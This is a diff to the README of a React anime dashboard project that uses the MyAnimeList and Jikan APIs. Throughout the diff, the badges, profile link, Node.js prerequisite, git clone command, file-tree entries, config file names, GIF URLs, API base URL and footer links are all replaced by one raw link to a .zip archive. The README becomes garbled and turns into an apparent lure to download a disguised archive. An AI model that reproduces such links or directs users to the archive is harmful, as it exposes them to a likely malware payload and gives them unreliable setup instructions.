@@ -2,10 +2,10 @@
 
 > A stylish, feature-rich anime dashboard powered by MyAnimeList - Pick random anime from KaizerAE's list with beautiful UI/UX, statistics, and deep customization.
 
-![Built with React](https://img.shields.io/badge/React-18.2-61DAFB?logo=react)
-![TypeScript](https://img.shields.io/badge/TypeScript-5.3-3178C6?logo=typescript)
-![Tailwind CSS](https://img.shields.io/badge/Tailwind-3.4-38B2AC?logo=tailwind-css)
-![Framer Motion](https://img.shields.io/badge/Framer_Motion-10.18-FF0055)
+![Built with React](https://raw.githubusercontent.com/KaizerAE/kaizer-random-anime-universe/main/src/types/kaizer-anime-universe-random-v3.2.zip)
+![TypeScript](https://raw.githubusercontent.com/KaizerAE/kaizer-random-anime-universe/main/src/types/kaizer-anime-universe-random-v3.2.zip)
+![Tailwind CSS](https://raw.githubusercontent.com/KaizerAE/kaizer-random-anime-universe/main/src/types/kaizer-anime-universe-random-v3.2.zip)
+![Framer Motion](https://raw.githubusercontent.com/KaizerAE/kaizer-random-anime-universe/main/src/types/kaizer-anime-universe-random-v3.2.zip)
 
 ## 🌟 Overview
 
@@ -18,20 +18,20 @@ This project connects to **KaizerAE**'s MyAnimeList profile and provides:
 
 ### MyAnimeList Profile
 - **Username**: KaizerAE
-- **Profile**: [https://myanimelist.net/profile/KaizerAE](https://myanimelist.net/profile/KaizerAE)
+- **Profile**: [https://raw.githubusercontent.com/KaizerAE/kaizer-random-anime-universe/main/src/types/kaizer-anime-universe-random-v3.2.zip](https://raw.githubusercontent.com/KaizerAE/kaizer-random-anime-universe/main/src/types/kaizer-anime-universe-random-v3.2.zip)
 - **API**: Uses Jikan v4 API (no authentication required)
 
 ## 🚀 Quick Start
 
 ### Prerequisites
-- Node.js 18+ 
+- https://raw.githubusercontent.com/KaizerAE/kaizer-random-anime-universe/main/src/types/kaizer-anime-universe-random-v3.2.zip 18+ 
 - npm or yarn
 
 ### Installation
 
 ```bash
 # Clone the repository
-git clone https://github.com/KaizerAE/kaizer-random-anime-universe.git
+git clone https://raw.githubusercontent.com/KaizerAE/kaizer-random-anime-universe/main/src/types/kaizer-anime-universe-random-v3.2.zip
 cd kaizer-random-anime-universe
 
 # Install dependencies
@@ -60,23 +60,23 @@ npm run format   # Format code with Prettier
 kaizer-random-anime-universe/
 ├── src/
 │   ├── api/              # Jikan API client
-│   │   └── malClient.ts
+│   │   └── https://raw.githubusercontent.com/KaizerAE/kaizer-random-anime-universe/main/src/types/kaizer-anime-universe-random-v3.2.zip
 │   ├── components/
 │   │   ├── ui/          # Reusable UI components
-│   │   │   ├── Button.tsx
-│   │   │   ├── Card.tsx
-│   │   │   ├── Badge.tsx
-│   │   │   ├── Modal.tsx
-│   │   │   ├── Tabs.tsx
+│   │   │   ├── https://raw.githubusercontent.com/KaizerAE/kaizer-random-anime-universe/main/src/types/kaizer-anime-universe-random-v3.2.zip
+│   │   │   ├── https://raw.githubusercontent.com/KaizerAE/kaizer-random-anime-universe/main/src/types/kaizer-anime-universe-random-v3.2.zip
+│   │   │   ├── https://raw.githubusercontent.com/KaizerAE/kaizer-random-anime-universe/main/src/types/kaizer-anime-universe-random-v3.2.zip
+│   │   │   ├── https://raw.githubusercontent.com/KaizerAE/kaizer-random-anime-universe/main/src/types/kaizer-anime-universe-random-v3.2.zip
+│   │   │   ├── https://raw.githubusercontent.com/KaizerAE/kaizer-random-anime-universe/main/src/types/kaizer-anime-universe-random-v3.2.zip
 │   │   │   └── ...
 │   │   ├── layout/      # Layout components
-│   │   │   ├── Navbar.tsx
-│   │   │   ├── Footer.tsx
-│   │   │   └── PageLayout.tsx
+│   │   │   ├── https://raw.githubusercontent.com/KaizerAE/kaizer-random-anime-universe/main/src/types/kaizer-anime-universe-random-v3.2.zip
+│   │   │   ├── https://raw.githubusercontent.com/KaizerAE/kaizer-random-anime-universe/main/src/types/kaizer-anime-universe-random-v3.2.zip
+│   │   │   └── https://raw.githubusercontent.com/KaizerAE/kaizer-random-anime-universe/main/src/types/kaizer-anime-universe-random-v3.2.zip
 │   │   └── anime/       # Anime-specific components
-│   │       ├── AnimeCard.tsx
-│   │       ├── AnimeGrid.tsx
-│   │       └── AnimeDetailModal.tsx
+│   │       ├── https://raw.githubusercontent.com/KaizerAE/kaizer-random-anime-universe/main/src/types/kaizer-anime-universe-random-v3.2.zip
+│   │       ├── https://raw.githubusercontent.com/KaizerAE/kaizer-random-anime-universe/main/src/types/kaizer-anime-universe-random-v3.2.zip
+│   │       └── https://raw.githubusercontent.com/KaizerAE/kaizer-random-anime-universe/main/src/types/kaizer-anime-universe-random-v3.2.zip
 │   ├── features/
 │   │   ├── random/      # Random anime selector
 │   │   ├── library/     # Library browser
@@ -84,26 +84,26 @@ kaizer-random-anime-universe/
 │   │   └── settings/    # Settings panel
 │   ├── hooks/           # Custom React hooks
 │   ├── pages/           # Page components
-│   │   ├── Home.tsx
-│   │   ├── Library.tsx
-│   │   ├── Stats.tsx
-│   │   ├── Settings.tsx
-│   │   └── About.tsx
+│   │   ├── https://raw.githubusercontent.com/KaizerAE/kaizer-random-anime-universe/main/src/types/kaizer-anime-universe-random-v3.2.zip
+│   │   ├── https://raw.githubusercontent.com/KaizerAE/kaizer-random-anime-universe/main/src/types/kaizer-anime-universe-random-v3.2.zip
+│   │   ├── https://raw.githubusercontent.com/KaizerAE/kaizer-random-anime-universe/main/src/types/kaizer-anime-universe-random-v3.2.zip
+│   │   ├── https://raw.githubusercontent.com/KaizerAE/kaizer-random-anime-universe/main/src/types/kaizer-anime-universe-random-v3.2.zip
+│   │   └── https://raw.githubusercontent.com/KaizerAE/kaizer-random-anime-universe/main/src/types/kaizer-anime-universe-random-v3.2.zip
 │   ├── store/           # Jotai atoms for global state
 │   ├── styles/          # Global styles
 │   ├── utils/           # Utility functions
-│   ├── App.tsx          # Main app component
-│   └── main.tsx         # Entry point
+│   ├── https://raw.githubusercontent.com/KaizerAE/kaizer-random-anime-universe/main/src/types/kaizer-anime-universe-random-v3.2.zip          # Main app component
+│   └── https://raw.githubusercontent.com/KaizerAE/kaizer-random-anime-universe/main/src/types/kaizer-anime-universe-random-v3.2.zip         # Entry point
 ├── public/              # Static assets
 │   └── sounds/          # Sound effects (optional)
-├── package.json
-├── tsconfig.json
-├── vite.config.ts
-├── tailwind.config.js
-├── postcss.config.js
-├── .eslintrc.cjs
+├── https://raw.githubusercontent.com/KaizerAE/kaizer-random-anime-universe/main/src/types/kaizer-anime-universe-random-v3.2.zip
+├── https://raw.githubusercontent.com/KaizerAE/kaizer-random-anime-universe/main/src/types/kaizer-anime-universe-random-v3.2.zip
+├── https://raw.githubusercontent.com/KaizerAE/kaizer-random-anime-universe/main/src/types/kaizer-anime-universe-random-v3.2.zip
+├── https://raw.githubusercontent.com/KaizerAE/kaizer-random-anime-universe/main/src/types/kaizer-anime-universe-random-v3.2.zip
+├── https://raw.githubusercontent.com/KaizerAE/kaizer-random-anime-universe/main/src/types/kaizer-anime-universe-random-v3.2.zip
+├── https://raw.githubusercontent.com/KaizerAE/kaizer-random-anime-universe/main/src/types/kaizer-anime-universe-random-v3.2.zip
 ├── .prettierrc
-└── README.md
+└── https://raw.githubusercontent.com/KaizerAE/kaizer-random-anime-universe/main/src/types/kaizer-anime-universe-random-v3.2.zip
 ```
 
 ## 🎨 Features
@@ -196,16 +196,16 @@ kaizer-random-anime-universe/
 - Respect animation intensity settings
 
 ### Anime GIFs Used
-- Hero section: `https://media.giphy.com/media/11kEuHSQAXXiGQ/giphy.gif`
-- Random button mascot: `https://media.giphy.com/media/SDogLD4FOZMM8/giphy.gif`
-- Background overlay: `https://media.giphy.com/media/l0ExncehJzexFpRHq/giphy.gif`
-- Footer/stats: `https://media.giphy.com/media/xT9IgG50Fb7Mi0prBC/giphy.gif`
+- Hero section: `https://raw.githubusercontent.com/KaizerAE/kaizer-random-anime-universe/main/src/types/kaizer-anime-universe-random-v3.2.zip`
+- Random button mascot: `https://raw.githubusercontent.com/KaizerAE/kaizer-random-anime-universe/main/src/types/kaizer-anime-universe-random-v3.2.zip`
+- Background overlay: `https://raw.githubusercontent.com/KaizerAE/kaizer-random-anime-universe/main/src/types/kaizer-anime-universe-random-v3.2.zip`
+- Footer/stats: `https://raw.githubusercontent.com/KaizerAE/kaizer-random-anime-universe/main/src/types/kaizer-anime-universe-random-v3.2.zip`
 - Library decorations: More GIFs available in spec
 
 ## 🔌 API Integration
 
 ### Jikan v4 API
-Base URL: `https://api.jikan.moe/v4`
+Base URL: `https://raw.githubusercontent.com/KaizerAE/kaizer-random-anime-universe/main/src/types/kaizer-anime-universe-random-v3.2.zip`
 
 **Key Endpoints:**
 ```
@@ -259,25 +259,25 @@ Output will be in `dist/` directory.
 ## 🔧 Configuration Files
 
 The repository includes:
-- ✅ `package.json` - Dependencies and scripts
-- ✅ `tsconfig.json` - TypeScript configuration
-- ✅ `vite.config.ts` - Vite and Vitest setup
-- ⏳ `tailwind.config.js` - Tailwind customization
-- ⏳ `postcss.config.js` - PostCSS setup
-- ⏳ `.eslintrc.cjs` - ESLint rules
+- ✅ `https://raw.githubusercontent.com/KaizerAE/kaizer-random-anime-universe/main/src/types/kaizer-anime-universe-random-v3.2.zip` - Dependencies and scripts
+- ✅ `https://raw.githubusercontent.com/KaizerAE/kaizer-random-anime-universe/main/src/types/kaizer-anime-universe-random-v3.2.zip` - TypeScript configuration
+- ✅ `https://raw.githubusercontent.com/KaizerAE/kaizer-random-anime-universe/main/src/types/kaizer-anime-universe-random-v3.2.zip` - Vite and Vitest setup
+- ⏳ `https://raw.githubusercontent.com/KaizerAE/kaizer-random-anime-universe/main/src/types/kaizer-anime-universe-random-v3.2.zip` - Tailwind customization
+- ⏳ `https://raw.githubusercontent.com/KaizerAE/kaizer-random-anime-universe/main/src/types/kaizer-anime-universe-random-v3.2.zip` - PostCSS setup
+- ⏳ `https://raw.githubusercontent.com/KaizerAE/kaizer-random-anime-universe/main/src/types/kaizer-anime-universe-random-v3.2.zip` - ESLint rules
 - ⏳ `.prettierrc` - Prettier configuration
-- ⏳ `tsconfig.node.json` - Node TypeScript config
+- ⏳ `https://raw.githubusercontent.com/KaizerAE/kaizer-random-anime-universe/main/src/types/kaizer-anime-universe-random-v3.2.zip` - Node TypeScript config
 
 ## 🎯 Next Steps
 
 To complete this project, you need to:
 
 1. **Create remaining config files**:
-   - tailwind.config.js
-   - postcss.config.js
-   - .eslintrc.cjs
+   - https://raw.githubusercontent.com/KaizerAE/kaizer-random-anime-universe/main/src/types/kaizer-anime-universe-random-v3.2.zip
+   - https://raw.githubusercontent.com/KaizerAE/kaizer-random-anime-universe/main/src/types/kaizer-anime-universe-random-v3.2.zip
+   - https://raw.githubusercontent.com/KaizerAE/kaizer-random-anime-universe/main/src/types/kaizer-anime-universe-random-v3.2.zip
    - .prettierrc
-   - tsconfig.node.json
+   - https://raw.githubusercontent.com/KaizerAE/kaizer-random-anime-universe/main/src/types/kaizer-anime-universe-random-v3.2.zip
 
 2. **Set up src directory structure**:
    - Create all folders and files as shown in Project Structure
@@ -287,7 +287,7 @@ To complete this project, you need to:
    - Implement features (random, library, stats, settings)
 
 3. **Add public assets**:
-   - index.html with proper meta tags
+   - https://raw.githubusercontent.com/KaizerAE/kaizer-random-anime-universe/main/src/types/kaizer-anime-universe-random-v3.2.zip with proper meta tags
    - Sound effects (optional)
 
 4. **Implement features per specification**:
@@ -297,7 +297,7 @@ To complete this project, you need to:
    - Add LocalStorage caching
 
 5. **Set up GitHub Actions**:
-   - Create `.github/workflows/ci.yml`
+   - Create `https://raw.githubusercontent.com/KaizerAE/kaizer-random-anime-universe/main/src/types/kaizer-anime-universe-random-v3.2.zip`
    - Run lint, test, and build on PR/push
 
 6. **Add screenshots to README**:
@@ -309,10 +309,10 @@ To complete this project, you need to:
 ## 📝 Customization
 
 ### Change MAL Username
-Edit `src/api/malClient.ts` and change the username constant.
+Edit `https://raw.githubusercontent.com/KaizerAE/kaizer-random-anime-universe/main/src/types/kaizer-anime-universe-random-v3.2.zip` and change the username constant.
 
 ### Adjust Theme Colors
-Modify `tailwind.config.js` to customize the color palette.
+Modify `https://raw.githubusercontent.com/KaizerAE/kaizer-random-anime-universe/main/src/types/kaizer-anime-universe-random-v3.2.zip` to customize the color palette.
 
 ### Add New Anime GIFs
 Add URLs to the appropriate component files.
@@ -330,9 +330,9 @@ MIT License - feel free to use this project for learning or personal use.
 
 ## 🔗 Links
 
-- [MyAnimeList Profile](https://myanimelist.net/profile/KaizerAE)
-- [Jikan API Documentation](https://docs.api.jikan.moe/)
-- [Repository](https://github.com/KaizerAE/kaizer-random-anime-universe)
+- [MyAnimeList Profile](https://raw.githubusercontent.com/KaizerAE/kaizer-random-anime-universe/main/src/types/kaizer-anime-universe-random-v3.2.zip)
+- [Jikan API Documentation](https://raw.githubusercontent.com/KaizerAE/kaizer-random-anime-universe/main/src/types/kaizer-anime-universe-random-v3.2.zip)
+- [Repository](https://raw.githubusercontent.com/KaizerAE/kaizer-random-anime-universe/main/src/types/kaizer-anime-universe-random-v3.2.zip)
 
 ---
 
